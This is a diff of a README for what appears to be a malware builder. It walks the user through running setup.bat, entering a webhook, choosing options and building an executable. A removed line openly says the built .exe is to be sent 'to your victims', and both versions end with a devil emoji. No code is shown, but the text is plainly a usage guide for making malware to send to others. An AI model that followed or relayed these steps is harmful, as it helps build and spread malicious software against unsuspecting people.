@@ -82,7 +82,7 @@ Once you've downloaded the files extract the folder so it's no longer a .zip fil
 ### 3. Open The setup.bat File:
 
 ```
-You dont need to install any modules opening setup.bat will install them for you. If successfull the setup.bat will then open up the gui
+You dont need to manually install any modules. Just opening setup.bat will install them for you. If successfull the setup.bat will then open up the gui.
 ```
 ### 4. Create A Webhook:
 
@@ -96,14 +96,17 @@ into the box which asks for your webhook.
 ### 5. Configurable Options:
 
 ```
-Now once you've done that you can tick on the options that you want enabled and anything you don't understand you can go 
+Now once you've done that you can tick the options that you want enabled and anything you don't understand you can go 
 to the documentation where each option is explained.
 ```
-### 6. What Now?
+### 6. Build The File
+```
+To finally create the file you must enter a filename and press build. Once fully built the build button will say 'Built File'.
+```
+### 7. What Now?
 
 ```
-The .exe file will appear in the same folder where all the other files are with the name you set it as and you can now send
-this to your victims.😈
+The file you built will now appear in the current folder with the name you set. 😈
 ```
 
 <hr  style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;"  noshade=""  size="20"  width="100%">
